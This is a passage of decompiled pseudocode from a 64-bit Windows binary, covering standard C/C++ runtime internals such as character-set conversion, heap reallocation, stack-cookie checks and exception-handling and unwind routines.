int __fastcall sub_14001DA38(UINT a1, int a2, const WCHAR *a3, int a4, CHAR *a5, int a6, const CHAR *a7, BOOL *a8)
{
  bool v10; // zf
  bool v11; // zf
  UINT v12; // eax
  DWORD v13; // edx
  BOOL *v15; // r8

  if ( a1 > 0xDEAC )
  {
    if ( a1 == 57005 || a1 == 57006 || a1 == 57007 || a1 == 57008 || a1 == 57009 || a1 == 57010 || a1 == 57011 )
      goto LABEL_25;
    v12 = a1 - 65000;
    v11 = a1 == 65000;
    goto LABEL_21;
  }
  if ( a1 == 57004 )
    goto LABEL_25;
  if ( a1 > 0xC433 )
  {
    if ( a1 != 50229 && a1 != 54936 )
    {
      v12 = a1 - 57002;
      v11 = a1 == 57002;
LABEL_21:
      if ( !v11 )
      {
        v10 = v12 == 1;
        goto LABEL_23;
      }
    }
LABEL_25:
    v13 = 0;
    goto LABEL_26;
  }
  if ( a1 == 50227 || a1 == 42 || a1 == 50220 || a1 == 50221 || a1 == 50222 )
    goto LABEL_25;
  v10 = a1 == 50225;
LABEL_23:
  if ( v10 )
    goto LABEL_25;
  v13 = a2 & 0xFFFFFF7F;
LABEL_26:
  v15 = a8;
  if ( a1 - 65000 <= 1 )
  {
    v15 = nullptr;
    a7 = nullptr;
    if ( a8 != nullptr )
      *a8 = false;
  }
  return WideCharToMultiByte(a1, v13, a3, a4, a5, a6, a7, v15);
}


// ----- sub_14001DB20 @ 0x14001db20 -----
__int64 __fastcall sub_14001DB20(LPVOID lpMem, unsigned __int64 a2, unsigned __int64 a3)
{
  unsigned __int64 v7; // rdi
  SIZE_T v8; // rbx
  __int64 v9; // rax
  __int64 v10; // rsi

  if ( a2 != 0 && 0xFFFFFFFFFFFFFFE0uLL / a2 < a3 )
  {
    *(_DWORD *)sub_14001A8F0() = 12;
    return 0;
  }
  else
  {
    if ( lpMem != nullptr )
      v7 = sub_14001DBD0();
    else
      v7 = 0;
    v8 = a3 * a2;
    v9 = sub_14001DC20(lpMem, v8);
    v10 = v9;
    if ( v9 != 0 && v7 < v8 )
      sub_1400230C0(v9 + v7, 0, v8 - v7);
    return v10;
  }
}


// ----- sub_14001DBD0 @ 0x14001dbd0 -----
SIZE_T __fastcall sub_14001DBD0(const void *a1)
{
  if ( a1 != nullptr )
    return HeapSize(qword_1400277A8, 0, a1);
  *(_DWORD *)sub_14001A8F0() = 22;
  sub_14001A770();
  return -1;
}


// ----- sub_14001DC10 @ 0x14001dc10 -----
// attributes: thunk
SIZE_T __fastcall sub_14001DC10(const void *a1)
{
  return sub_14001DBD0(a1);
}


// ----- sub_14001DC20 @ 0x14001dc20 -----
LPVOID __fastcall sub_14001DC20(LPVOID lpMem, SIZE_T dwBytes)
{
  LPVOID result; // rax

  if ( lpMem == nullptr )
    return sub_14001C800(dwBytes);
  if ( dwBytes == 0 )
  {
    sub_14001B590(lpMem);
    return nullptr;
  }
  if ( dwBytes > 0xFFFFFFFFFFFFFFE0uLL )
  {
LABEL_6:
    *(_DWORD *)sub_14001A8F0() = 12;
    return nullptr;
  }
  while ( 1 )
  {
    result = HeapReAlloc(qword_1400277A8, 0, lpMem, dwBytes);
    if ( result != nullptr )
      return result;
    if ( (unsigned int)sub_14001D310() == 0 || (unsigned int)sub_14001D210(dwBytes) == 0 )
      goto LABEL_6;
  }
}


// ----- sub_14001DCA0 @ 0x14001dca0 -----
void sub_14001DCA0()
{
  dword_1400277E0 = 0;
}


// ----- __report_gsfailure @ 0x14001dcb0 -----
void __cdecl __noreturn _report_gsfailure(uintptr_t StackCookie)
{
  __fastfail(2u);
}


// ----- nullsub_7 @ 0x14001dcb7 -----
void nullsub_7()
{
  ;
}


// ----- __GSHandlerCheck @ 0x14001dcc0 -----
__int64 __fastcall _GSHandlerCheck(__int64 a1, __int64 a2, __int64 a3, __int64 a4)
{
  sub_14001DCE0(a2, a4, *(_QWORD *)(a4 + 56));
  return 1;
}


// ----- sub_14001DCE0 @ 0x14001dce0 -----
__int64 __fastcall sub_14001DCE0(__int64 a1, __int64 a2, _DWORD *a3)
{
  _BYTE *v3; // rdx
  unsigned int v4; // ecx
  __int64 v5; // r11
  _BYTE *v6; // rdx
  unsigned int i; // ecx
  __int64 v8; // rax
  int v9; // ebx
  uintptr_t v10; // rcx
  char v11; // r9
  __int64 v12; // rax

  v3 = (_BYTE *)(*(unsigned int *)(*(_QWORD *)(a2 + 16) + 8LL) + *(_QWORD *)(a2 + 8));
  v4 = (unsigned __int8)v3[3];
  if ( (*v3 & 7u) >= 3 )
  {
    v5 = v4 & 0x1F;
    if ( (v4 & 0x1F) != 0 )
    {
      if ( (*v3 & 0x40) != 0 )
        v6 = &v3[2 * v5 + 5];
      else
        v6 = &v3[(v4 & 0x1F) + 4];
      for ( i = v4 >> 5; i != 0; --i )
      {
        v8 = (unsigned __int8)*v6 >> 3;
        if ( (_DWORD)v8 != 0 )
        {
          if ( (*v6 & 2) != 0 )
            v6 += 2 * v8 + 7;
          else
            v6 += (unsigned int)v8 + 6;
        }
        else
        {
          v6 += 3;
        }
      }
      v9 = 0;
      if ( (_DWORD)v5 != 0 )
      {
        while ( 1 )
        {
          v10 = (unsigned __int8)*v6;
          if ( (unsigned __int8)v10 <= 3u )
            goto LABEL_20;
          v11 = v10 & 0xF;
          if ( (unsigned __int8)((v10 & 0xF) - 8) <= 2u )
            break;
          v11 = v10 & 7;
          if ( (unsigned __int8)((v10 & 7) - 4) <= 3u )
            break;
          LOBYTE(v10) = v10 & 0x3F;
          if ( (_BYTE)v10 != 32 )
            _report_gsfailure(v10);
LABEL_21:
          switch ( (char)v10 )
          {
            case 1:
            case 5:
            case 9:
              v12 = 5;
              break;
            case 2:
            case 6:
            case 10:
              v12 = 3;
              break;
            case 3:
            case 32:
              v12 = 2;
              break;
            case 4:
            case 7:
            case 8:
              v12 = 1;
              break;
          }
          v6 += v12;
          if ( ++v9 >= (unsigned int)v5 )
            return (int)(*a3 & 0xFFFFFFF8);
        }
        LOBYTE(v10) = v11;
LABEL_20:
        if ( (_BYTE)v10 == 0 )
          return (int)(*a3 & 0xFFFFFFF8);
        goto LABEL_21;
      }
    }
  }
  return (int)(*a3 & 0xFFFFFFF8);
}


// ----- __security_check_cookie @ 0x14001ded0 -----
void __cdecl _security_check_cookie(uintptr_t StackCookie)
{
  __int64 v1; // rcx

  if ( StackCookie != _security_cookie )
LABEL_4:
    _report_gsfailure(StackCookie);
  v1 = __ROL8__(StackCookie, 16);
  if ( (_WORD)v1 != 0 )
  {
    StackCookie = __ROR8__(v1, 16);
    goto LABEL_4;
  }
}


// ----- sub_14001DEF0 @ 0x14001def0 -----
__int64 __fastcall sub_14001DEF0(PEXCEPTION_RECORD ExceptionRecord, PVOID TargetFrame, __int64 a3, __int64 a4)
{
  unsigned __int64 v8; // rcx
  __int64 v9; // r15
  unsigned int *v10; // rbx
  unsigned __int64 v11; // rbp
  unsigned int v12; // esi
  __int64 v13; // rax
  int v14; // eax
  unsigned int v16; // r9d
  unsigned __int64 v17; // rdi
  unsigned int *v18; // r8
  unsigned int i; // edx
  __int64 v20; // rax
  _QWORD v21[11]; // [rsp+30h] [rbp-58h] BYREF

  sub_14001EA50(a3);
  v9 = *(_QWORD *)(a4 + 8);
  v10 = *(unsigned int **)(a4 + 56);
  v11 = *(_QWORD *)a4 - v9;
  v12 = *(_DWORD *)(a4 + 72);
  if ( (ExceptionRecord->ExceptionFlags & 0x66) != 0 )
  {
    v16 = *v10;
    if ( v12 < *v10 )
    {
      v17 = *(_QWORD *)(a4 + 32) - v9;
      do
      {
        v18 = &v10[4 * v12];
        if ( v11 >= v18[1] && v11 < v18[2] )
        {
          if ( (ExceptionRecord->ExceptionFlags & 0x20) != 0 )
          {
            for ( i = 0; i < v16; ++i )
            {
              v8 = v10[4 * i + 1];
              if ( v17 >= v8 )
              {
                v8 = v10[4 * i + 2];
                if ( v17 < v8 )
                {
                  v8 = v18[4];
                  if ( v10[4 * i + 4] == (_DWORD)v8 )
                  {
                    v8 = v18[3];
                    if ( v10[4 * i + 3] == (_DWORD)v8 )
                      break;
                  }
                }
              }
            }
            if ( i != *v10 )
              return 1;
          }
          v20 = v18[4];
          if ( (_DWORD)v20 != 0 )
          {
            if ( v17 == v20 && (ExceptionRecord->ExceptionFlags & 0x20) != 0 )
              return 1;
          }
          else
          {
            *(_DWORD *)(a4 + 72) = v12 + 1;
            LOBYTE(v8) = 1;
            ((void (__fastcall *)(unsigned __int64, PVOID))(v9 + v18[3]))(v8, TargetFrame);
          }
        }
        v16 = *v10;
        ++v12;
      }
      while ( v12 < *v10 );
    }
  }
  else
  {
    v21[0] = ExceptionRecord;
    for ( v21[1] = a3; v12 < *v10; ++v12 )
    {
      if ( v11 >= v10[4 * v12 + 1] && v11 < v10[4 * v12 + 2] && v10[4 * v12 + 4] != 0 )
      {
        v13 = v10[4 * v12 + 3];
        if ( (_DWORD)v13 == 1 )
          goto LABEL_10;
        v14 = ((__int64 (__fastcall *)(_QWORD *, PVOID))(v9 + v13))(v21, TargetFrame);
        if ( v14 < 0 )
          return 0;
        if ( v14 > 0 )
        {
LABEL_10:
          if ( ExceptionRecord->ExceptionCode == -529697949
            && sub_14001E100 != nullptr
            && (unsigned int)sub_140022840(&off_140007AE8) != 0 )
          {
            sub_14001E100(ExceptionRecord, 1);
          }
          sub_14001EA10(v9 + v10[4 * v12 + 4], TargetFrame, 1);
          RtlUnwindEx(
            TargetFrame,
            (PVOID)(v9 + v10[4 * v12 + 4]),
            ExceptionRecord,
            (PVOID)ExceptionRecord->ExceptionCode,
            *(PCONTEXT *)(a4 + 40),
            *(PUNWIND_HISTORY_TABLE *)(a4 + 64));
          nullsub_2();
        }
      }
    }
  }
  return 1;
}


// ----- sub_14001E100 @ 0x14001e100 -----
void __fastcall sub_14001E100(__int64 a1)
{
  __int64 v1; // rax
  __int64 v2; // rdx
  __int64 v3; // rcx

  if ( a1 != 0
    && *(_DWORD *)a1 == -529697949
    && *(_DWORD *)(a1 + 24) == 4
    && (unsigned int)(*(_DWORD *)(a1 + 32) - 429065504) <= 2 )
  {
    v1 = *(_QWORD *)(a1 + 48);
    if ( v1 != 0 )
    {
      v2 = *(int *)(v1 + 4);
      if ( (_DWORD)v2 != 0 )
      {
        ((void (__fastcall *)(_QWORD))(*(_QWORD *)(a1 + 56) + v2))(*(_QWORD *)(a1 + 40));
      }
      else if ( (*(_BYTE *)v1 & 0x10) != 0 )
      {
        v3 = **(_QWORD **)(a1 + 40);
        if ( v3 != 0 )
          (*(void (__fastcall **)(__int64))(*(_QWORD *)v3 + 16LL))(v3);
      }
    }
  }
}


// ----- ?_CallMemberFunction0@@YAXQEAX0@Z @ 0x14001e170 -----
void __fastcall _CallMemberFunction0(void *const a1, void (__fastcall *a2)(void *const))
{
  a2(a1);
}


// ----- sub_14001E180 @ 0x14001e180 -----
__int64 __fastcall sub_14001E180(__int64 a1)
{
  _QWORD *v2; // rax

  v2 = *(_QWORD **)(sub_14001EA90() + 88);
  if ( v2 == nullptr )
    return 1;
  while ( *v2 != a1 )
  {
    v2 = (_QWORD *)v2[1];
    if ( v2 == nullptr )
      return 1;
  }
  return 0;
}


// ----- sub_14001E1C0 @ 0x14001e1c0 -----
__int64 __fastcall sub_14001E1C0(__int64 a1, int *a2)
{
  __int64 v2; // rax

  v2 = a2[1];
  if ( (int)v2 < 0 )
    return a1 + *a2;
  else
    return a1 + *a2 + v2 + *(int *)(a2[2] + *(_QWORD *)(v2 + a1));
}


// ----- sub_14001E1F0 @ 0x14001e1f0 -----
__int64 __fastcall sub_14001E1F0(int **a1)
{
  int *v1; // rdi
  int v3; // eax
  __int64 v4; // rax
  int *v6; // rbx

  v3 = **a1;
  if ( v3 == -532462766 || v3 == -532459699 )
  {
    if ( *(int *)(sub_14001EA90() + 48) > 0 )
    {
      v4 = sub_14001EA90();
      --*(_DWORD *)(v4 + 48);
    }
  }
  else if ( v3 == -529697949 )
  {
    v1 = *a1;
    *(_QWORD *)(sub_14001EA90() + 32) = v1;
    v6 = a1[1];
    *(_QWORD *)(sub_14001EA90() + 40) = v6;
    sub_14001D9E8();
  }
  return 0;
}


// ----- sub_14001E260 @ 0x14001e260 -----
void __noreturn sub_14001E260()
{
  sub_14001D9E8();
}


// ----- sub_14001E270 @ 0x14001e270 -----
__int64 __fastcall sub_14001E270(unsigned int *a1, __int64 a2, __int64 a3)
{
  __int64 v4; // rax
  _QWORD v6[5]; // [rsp+50h] [rbp-28h] BYREF

  v6[0] = a1;
  v6[1] = a3;
  v4 = sub_14001EA90();
  (*(void (__fastcall **)(_QWORD, _QWORD *))(v4 + 16))(*a1, v6);
  return 0;
}


// ----- sub_14001E2C0 @ 0x14001e2c0 -----
bool __fastcall sub_14001E2C0(__int64 a1, __int64 a2)
{
  int v3; // eax
  int v4; // edi
  int v5; // esi
  __int64 v6; // rax

  v3 = sub_14001EC80(a2, a1);
  v4 = *(_DWORD *)(a2 + 12);
  v5 = v3;
  if ( v4 != 0 )
  {
    while ( 1 )
    {
      v6 = *(int *)(a2 + 16) + *(_QWORD *)(sub_14001EA90() + 96) + 20LL * (unsigned int)--v4;
      if ( v5 > *(_DWORD *)(v6 + 4) && v5 <= *(_DWORD *)(v6 + 8) )
        break;
      if ( v4 == 0 )
        goto LABEL_5;
    }
  }
  else
  {
LABEL_5:
    v6 = 0;
  }
  return v6 != 0;
}


// ----- sub_14001E320 @ 0x14001e320 -----
__int64 __fastcall sub_14001E320(__int64 *a1, ULONG64 *a2, __int64 a3)
{
  __int64 v3; // rsi
  int v7; // r14d
  ULONG64 v8; // rdi
  __int64 v9; // rbx
  PRUNTIME_FUNCTION v10; // rax
  unsigned __int64 v11; // r9
  unsigned int v12; // r8d
  __int64 BeginAddress; // r10
  __int64 v14; // rax
  int v15; // eax
  __int64 v16; // rbx
  int v17; // edi
  __int64 v18; // r8
  __int64 v20; // [rsp+50h] [rbp+8h] BYREF
  unsigned __int64 ImageBase; // [rsp+60h] [rbp+18h] BYREF

  LODWORD(v3) = *(_DWORD *)(a3 + 12);
  v7 = sub_14001EC80(a3, a2);
  v20 = *a1;
  if ( (_DWORD)v3 == 0 )
    goto LABEL_11;
  while ( 1 )
  {
    v3 = (unsigned int)(v3 - 1);
    v8 = a2[1];
    v9 = *(int *)(a3 + 16) + 20 * v3;
    if ( v7 > *(_DWORD *)(v8 + v9 + 4) && v7 <= *(_DWORD *)(v8 + v9 + 8) )
    {
      v10 = RtlLookupFunctionEntry(*a2, &ImageBase, nullptr);
      v11 = ImageBase + *(int *)(v8 + v9 + 16);
      v12 = *(_DWORD *)(v8 + v9 + 12);
      BeginAddress = v10->BeginAddress;
      v14 = 0;
      if ( v12 != 0 )
        break;
LABEL_7:
      if ( (unsigned int)v14 < v12 )
        goto LABEL_10;
    }
    if ( (_DWORD)v3 == 0 )
      goto LABEL_11;
  }
  while ( *(_DWORD *)(v11 + 20 * v14 + 12) != BeginAddress )
  {
    v14 = (unsigned int)(v14 + 1);
    if ( (unsigned int)v14 >= v12 )
      goto LABEL_7;
  }
LABEL_10:
  v20 = *(_QWORD *)(*(int *)(v11 + 20 * v14 + 16) + *a1);
LABEL_11:
  v15 = sub_14001EC80(a3, a2);
  LODWORD(v16) = *(_DWORD *)(a3 + 12);
  v17 = v15;
  if ( (_DWORD)v16 != 0 )
  {
    do
    {
      v16 = (unsigned int)(v16 - 1);
      v18 = *(int *)(a3 + 16) + *(_QWORD *)(sub_14001EA90() + 96);
    }
    while ( (v17 <= *(_DWORD *)(v18 + 20 * v16 + 4) || v17 > *(_DWORD *)(v18 + 20 * v16 + 8)) && (_DWORD)v16 != 0 );
  }
  return sub_14001FF60(&v20, a2, a3);
}


// ----- sub_14001E460 @ 0x14001e460 -----
_QWORD *__fastcall sub_14001E460(_QWORD *a1, ULONG64 *a2, __int64 a3, _QWORD *a4)
{
  __int64 v4; // rsi
  int v9; // ebp
  ULONG64 v10; // rdi
  __int64 v11; // rbx
  PRUNTIME_FUNCTION v12; // rax
  unsigned __int64 v13; // r9
  unsigned int v14; // r8d
  __int64 BeginAddress; // r10
  __int64 v16; // rax
  unsigned __int64 ImageBase; // [rsp+50h] [rbp+8h] BYREF

  LODWORD(v4) = *(_DWORD *)(a3 + 12);
  v9 = sub_14001EC80(a3, a2);
  *a4 = *a1;
  if ( (_DWORD)v4 == 0 )
    return a4;
  while ( 1 )
  {
    v4 = (unsigned int)(v4 - 1);
    v10 = a2[1];
    v11 = *(int *)(a3 + 16) + 20 * v4;
    if ( v9 > *(_DWORD *)(v10 + v11 + 4) && v9 <= *(_DWORD *)(v10 + v11 + 8) )
    {
      v12 = RtlLookupFunctionEntry(*a2, &ImageBase, nullptr);
      v13 = ImageBase + *(int *)(v10 + v11 + 16);
      v14 = *(_DWORD *)(v10 + v11 + 12);
      BeginAddress = v12->BeginAddress;
      v16 = 0;
      if ( v14 != 0 )
        break;
LABEL_7:
      if ( (unsigned int)v16 < v14 )
        goto LABEL_10;
    }
    if ( (_DWORD)v4 == 0 )
      return a4;
  }
  while ( *(_DWORD *)(v13 + 20 * v16 + 12) != BeginAddress )
  {
    v16 = (unsigned int)(v16 + 1);
    if ( (unsigned int)v16 >= v14 )
      goto LABEL_7;
  }
LABEL_10:
  *a4 = *(_QWORD *)(*(int *)(v13 + 20 * v16 + 16) + *a1);
  return a4;
}


// ----- sub_14001E570 @ 0x14001e570 -----
__int64 __fastcall sub_14001E570(__int64 a1, __int64 a2, int a3, __int64 a4, __int64 a5)
{
  unsigned int v9; // ebp
  int v10; // eax
  __int64 v11; // rdi
  int v12; // r11d
  __int64 v13; // rbx
  unsigned int v14; // ecx
  int v15; // r15d
  __int64 v16; // r9
  __int64 v17; // r8
  __int64 v18; // r10
  __int64 v19; // rbx
  __int64 v20; // rdx
  __int64 v21; // r8
  _DWORD *v22; // rcx
  _DWORD *v23; // rax
  int v24; // eax
  int v25; // eax
  int v26; // ecx
  int v28; // [rsp+2Ch] [rbp-3Ch]

  v9 = *(_DWORD *)(a5 + 12);
  v10 = sub_14001EC80(a5, a4);
  if ( v9 == 0 )
    sub_14001B2E4();
  v11 = *(_QWORD *)(a4 + 8);
  v12 = -1;
  v13 = *(int *)(a5 + 16);
  v14 = v9;
  v15 = -1;
  v16 = v11 + v13;
  while ( 1 )
  {
    v17 = v14 - 1;
    if ( v10 > *(_DWORD *)(v16 + 20 * v17 + 4) && v10 <= *(_DWORD *)(v16 + 20 * v17 + 8) )
      break;
    --v14;
    if ( (_DWORD)v17 == 0 )
    {
      v18 = 0;
      v19 = 0;
      goto LABEL_7;
    }
  }
  v19 = v11 + v13 + 20LL * (v14 - 1);
  v18 = v19;
LABEL_7:
  v20 = 0;
  do
  {
    v21 = 20 * v20;
    v22 = (_DWORD *)(20 * v20 + v16);
    if ( v19 != 0 )
    {
      if ( *v22 <= *(_DWORD *)(v18 + 4) || v22[1] > *(_DWORD *)(v18 + 8) )
        goto LABEL_19;
      v23 = (_DWORD *)(v21 + v16 + 4);
    }
    else
    {
      v23 = v22 + 1;
      v22 = (_DWORD *)(v16 + v21);
    }
    if ( a3 >= *v22 && a3 <= *v23 )
    {
      v24 = v20;
      v15 = v20;
      if ( v12 != -1 )
        v24 = v12;
      v12 = v24;
    }
LABEL_19:
    v20 = (unsigned int)(v20 + 1);
  }
  while ( (unsigned int)v20 < v9 );
  v25 = 0;
  *(_QWORD *)a1 = a2;
  *(_QWORD *)(a1 + 16) = a2;
  if ( v12 != -1 )
    v25 = v12;
  v26 = 0;
  *(_DWORD *)(a1 + 8) = v25;
  *(_DWORD *)(a1 + 12) = v28;
  if ( v12 != -1 )
    v26 = v15 + 1;
  *(_DWORD *)(a1 + 28) = v28;
  *(_DWORD *)(a1 + 24) = v26;
  return a1;
}


// ----- sub_14001E6C0 @ 0x14001e6c0 -----
void __fastcall sub_14001E6C0(
        void **a1,
        ULONG_PTR a2,
        ULONG_PTR a3,
        ULONG_PTR a4,
        ULONG_PTR a5,
        ULONG_PTR a6,
        int a7,
        int a8,
        int a9,
        __int64 a10,
        unsigned __int8 a11)
{
  void *v11; // rcx
  struct _CONTEXT *ContextRecord; // rax
  void *v13; // rdx
  struct _UNWIND_HISTORY_TABLE *HistoryTable; // [rsp+28h] [rbp-C0h]
  EXCEPTION_RECORD ExceptionRecord; // [rsp+30h] [rbp-B8h] BYREF

  v11 = *a1;
  *(_OWORD *)&ExceptionRecord.ExceptionCode = xmmword_140007AF0;
  *(_OWORD *)&ExceptionRecord.ExceptionAddress = xmmword_140007B00;
  ExceptionRecord.ExceptionInformation[4] = 0;
  ExceptionRecord.ExceptionInformation[6] = 0;
  memset(&ExceptionRecord.ExceptionInformation[8], 0, 56);
  ExceptionRecord.ExceptionInformation[0] = (ULONG_PTR)sub_14001FCC0;
  ExceptionRecord.ExceptionInformation[2] = a5;
  ExceptionRecord.ExceptionInformation[1] = a4;
  ExceptionRecord.ExceptionInformation[3] = a7;
  ExceptionRecord.ExceptionInformation[5] = a6;
  ExceptionRecord.ExceptionInformation[7] = a11;
  HistoryTable = *(struct _UNWIND_HISTORY_TABLE **)(a10 + 64);
  ContextRecord = *(struct _CONTEXT **)(a10 + 40);
  ExceptionRecord.ExceptionInformation[4] = a3;
  ExceptionRecord.ExceptionInformation[6] = a2;
  v13 = *(void **)a10;
  ExceptionRecord.ExceptionInformation[8] = 429065504;
  RtlUnwindEx(v11, v13, &ExceptionRecord, nullptr, ContextRecord, HistoryTable);
}


// ----- sub_14001E7F0 @ 0x14001e7f0 -----
_QWORD *__fastcall sub_14001E7F0(_QWORD *a1, __int64 a2)
{
  __int64 v3; // rcx

  *a1 = a2;
  if ( (unsigned __int64)a1 >= *(_QWORD *)(sub_14001EA90() + 88) )
    v3 = 0;
  else
    v3 = *(_QWORD *)(sub_14001EA90() + 88);
  a1[1] = v3;
  *(_QWORD *)(sub_14001EA90() + 88) = a1;
  return a1;
}


// ----- sub_14001E830 @ 0x14001e830 -----
__int64 __fastcall sub_14001E830(__int64 a1)
{
  __int64 v2; // rax
  __int64 v3; // rbx
  __int64 result; // rax

  if ( a1 != *(_QWORD *)(sub_14001EA90() + 88) || (v2 = *(_QWORD *)(sub_14001EA90() + 88)) == 0 )
LABEL_7:
    sub_14001B2E4();
  while ( 1 )
  {
    v3 = *(_QWORD *)(v2 + 8);
    if ( a1 == v2 )
      break;
    v2 = *(_QWORD *)(v2 + 8);
    if ( v3 == 0 )
      goto LABEL_7;
  }
  result = sub_14001EA90();
  *(_QWORD *)(result + 88) = v3;
  return result;
}


// ----- sub_14001E890 @ 0x14001e890 -----
__int64 sub_14001E890()
{
  return *(_QWORD *)(sub_14001EA90() + 96);
}


// ----- sub_14001E8B0 @ 0x14001e8b0 -----
__int64 sub_14001E8B0()
{
  return *(_QWORD *)(sub_14001EA90() + 104);
}


// ----- sub_14001E8D0 @ 0x14001e8d0 -----
__int64 __fastcall sub_14001E8D0(__int64 a1)
{
  __int64 result; // rax

  result = sub_14001EA90();
  *(_QWORD *)(result + 96) = a1;
  return result;
}


// ----- sub_14001E8F0 @ 0x14001e8f0 -----
__int64 __fastcall sub_14001E8F0(__int64 a1)
{
  __int64 result; // rax

  result = sub_14001EA90();
  *(_QWORD *)(result + 104) = a1;
  return result;
}


// ----- sub_14001E910 @ 0x14001e910 -----
__int64 __fastcall sub_14001E910(__int64 a1, __int64 a2, int a3, __int64 a4)
{
  __int64 v4; // rbx
  __int64 v8; // rbx
  __int64 v9; // rax
  __int64 v11; // [rsp+70h] [rbp+8h] BYREF

  v4 = *(_QWORD *)(a4 + 8);
  v11 = a2;
  *(_QWORD *)(sub_14001EA90() + 96) = v4;
  v8 = *(_QWORD *)(a1 + 56);
  *(_QWORD *)(sub_14001EA90() + 104) = v8;
  v9 = sub_14001EA90();
  return sub_14001FB90(a1, (unsigned int)&v11, a3, a4, *(_DWORD *)(v9 + 96) + **(_DWORD **)(a4 + 56), 0, 0, 0);
}


// ----- __C_specific_handler_noexcept @ 0x14001e990 -----
__int64 __fastcall _C_specific_handler_noexcept(__int64 a1, void *a2, __int64 a3, __int64 a4)
{
  __int64 result; // rax

  result = sub_14001DEF0((PEXCEPTION_RECORD)a1, a2, a3, a4);
  if ( (*(_BYTE *)(a1 + 4) & 0x66) == 0 && *(_DWORD *)a1 == -529697949 && (_DWORD)result == 1 )
  {
    *(_QWORD *)(sub_14001EA90() + 32) = a1;
    *(_QWORD *)(sub_14001EA90() + 40) = a3;
    sub_14001D9E8();
  }
  return result;
}


// ----- sub_14001EA10 @ 0x14001ea10 -----
void sub_14001EA10()
{
  ;
}


// ----- nullsub_2 @ 0x14001ea40 -----
void nullsub_2()
{
  ;
}


// ----- sub_14001EA50 @ 0x14001ea50 -----
void (*sub_14001EA50())()
{
  return guard_check_icall_nop;
}


// ----- sub_14001EA90 @ 0x14001ea90 -----
_DWORD *sub_14001EA90()
{
  DWORD LastError; // edi
  _DWORD *Value; // rax
  _DWORD *v2; // rbx
  _DWORD *v3; // rax
  void *v4; // rcx

  if ( dword_140026E10 == -1 )
LABEL_13:
    sub_14001B2E4();
  LastError = GetLastError();
  Value = FlsGetValue(dword_140026E10);
  v2 = Value;
  if ( Value == (_DWORD *)-1LL )
    goto LABEL_12;
  if ( Value != nullptr )
    goto LABEL_9;
  if ( !FlsSetValue(dword_140026E10, (PVOID)0xFFFFFFFFFFFFFFFFLL) )
  {
LABEL_12:
    SetLastError(LastError);
    goto LABEL_13;
  }
  v3 = sub_140020560(1u, 0x80u);
  v2 = v3;
  if ( v3 == nullptr )
  {
    FlsSetValue(dword_140026E10, nullptr);
    v4 = nullptr;
LABEL_11:
    sub_140020570(v4);
    goto LABEL_12;
  }
  if ( !FlsSetValue(dword_140026E10, v3) )
  {
    FlsSetValue(dword_140026E10, nullptr);
    v4 = v2;
    goto LABEL_11;
  }
  v2[30] = -2;
  sub_140020570(nullptr);
LABEL_9:
  SetLastError(LastError);
  return v2;
}


// ----- sub_14001EB70 @ 0x14001eb70 -----
__int64 __fastcall sub_14001EB70(_QWORD *a1, unsigned __int64 *a2, _DWORD *a3)
{
  __int64 result; // rax
  unsigned __int64 v4; // r9
  __int64 v5; // rbx
  unsigned int v6; // r8d
  unsigned __int64 v7; // r11
  __int64 v8; // rdx

  result = *(unsigned int *)((int)a3[7] + *a1);
  if ( (_DWORD)result == -2 )
  {
    v4 = a2[1];
    v5 = (int)a3[6];
    if ( v5 + v4 == 0 )
      sub_14001B2E4();
    v6 = a3[5];
    if ( v6 == 0 )
      return 0xFFFFFFFFLL;
    v7 = *a2;
    v8 = 0;
    do
    {
      if ( v7 < v4 + *(int *)(v5 + v4 + 8 * v8) )
        break;
      v8 = (unsigned int)(v8 + 1);
    }
    while ( (unsigned int)v8 < v6 );
    if ( (_DWORD)v8 != 0 )
      return *(unsigned int *)(v5 + 8LL * (unsigned int)(v8 - 1) + v4 + 4);
    else
      return 0xFFFFFFFFLL;
  }
  return result;
}


// ----- sub_14001EC00 @ 0x14001ec00 -----
__int64 __fastcall sub_14001EC00(_QWORD *a1, ULONG64 *a2, __int64 a3)
{
  __int64 v4; // rcx
  __int64 v5; // rax
  __int64 v7; // [rsp+40h] [rbp+18h] BYREF

  v4 = *sub_14001E460(a1, a2, a3, &v7);
  v5 = *(int *)(a3 + 28);
  v7 = v4;
  return *(unsigned int *)(v5 + v4 + 4);
}


// ----- sub_14001EC30 @ 0x14001ec30 -----
__int64 __fastcall sub_14001EC30(__int64 *a1, __int64 a2, __int64 a3, int a4)
{
  __int64 result; // rax

  result = *a1;
  *(_DWORD *)(*(int *)(a3 + 28) + *a1) = a4;
  return result;
}


// ----- sub_14001EC40 @ 0x14001ec40 -----
__int64 __fastcall sub_14001EC40(_QWORD *a1, ULONG64 *a2, __int64 a3, int a4)
{
  __int64 v6; // rcx
  __int64 result; // rax
  __int64 v8; // [rsp+40h] [rbp+18h] BYREF

  v6 = *sub_14001E460(a1, a2, a3, &v8);
  result = *(int *)(a3 + 28);
  v8 = v6;
  if ( a4 > *(_DWORD *)(v6 + result + 4) )
    *(_DWORD *)(v6 + result + 4) = a4;
  return result;
}


// ----- sub_14001EC80 @ 0x14001ec80 -----
__int64 __fastcall sub_14001EC80(__int64 a1, unsigned __int64 *a2)
{
  __int64 v2; // rbx
  unsigned __int64 v3; // r9
  unsigned int v4; // r8d
  unsigned __int64 v5; // r11
  __int64 v6; // rdx

  if ( a1 == 0 || (v2 = *(int *)(a1 + 24), v3 = a2[1], v2 + v3 == 0) )
    sub_14001B2E4();
  v4 = *(_DWORD *)(a1 + 20);
  if ( v4 == 0 )
    return 0xFFFFFFFFLL;
  v5 = *a2;
  v6 = 0;
  do
  {
    if ( v5 < v3 + *(int *)(v2 + v3 + 8 * v6) )
      break;
    v6 = (unsigned int)(v6 + 1);
  }
  while ( (unsigned int)v6 < v4 );
  if ( (_DWORD)v6 != 0 )
    return *(unsigned int *)(v2 + 8LL * (unsigned int)(v6 - 1) + v3 + 4);
  else
    return 0xFFFFFFFFLL;
}


// ----- sub_14001ECF0 @ 0x14001ecf0 -----
__int64 __fastcall sub_14001ECF0(__int64 a1, __int64 a2, unsigned __int64 a3)
{
  __int64 v3; // rbx
  __int64 v4; // r10
  unsigned int v5; // r9d
  __int64 v6; // rdx

  if ( a1 == 0 || (v3 = *(int *)(a1 + 24), v4 = *(_QWORD *)(a2 + 8), v3 + v4 == 0) )
    sub_14001B2E4();
  v5 = *(_DWORD *)(a1 + 20);
  if ( v5 == 0 )
    return 0xFFFFFFFFLL;
  v6 = 0;
  do
  {
    if ( a3 < v4 + *(int *)(v3 + v4 + 8 * v6) )
      break;
    v6 = (unsigned int)(v6 + 1);
  }
  while ( (unsigned int)v6 < v5 );
  if ( (_DWORD)v6 != 0 )
